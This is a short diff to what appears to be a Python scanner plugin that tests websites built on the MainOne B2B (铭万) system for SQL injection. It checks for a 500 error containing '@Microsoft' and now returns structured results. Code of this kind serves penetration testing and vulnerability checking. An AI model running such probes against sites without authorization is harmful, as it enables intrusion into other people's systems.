@@ -25,11 +25,14 @@ class mainone_b2b_Default_sqli_BaseVerify:
             req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
             if req.status_code == 500 and r"@Microsoft" in req.text:
                 cprint("[+]存在铭万事业通用建站系统SQL注入漏洞...(高危)\tpayload: "+vulnurl, "red")
+                return True, vulnurl, "铭万事业通用建站系统SQL注入", payload, req.text
             else:
                 cprint("[-]不存在mainone_b2b_Default_sqli漏洞", "white", "on_grey")
+                return False, None, None, None, None
 
         except:
             cprint("[-] "+__file__+"====>可能不存在漏洞", "cyan")
+            return False, None, None, None, None
 
 if __name__ == "__main__":
     warnings.filterwarnings("ignore")
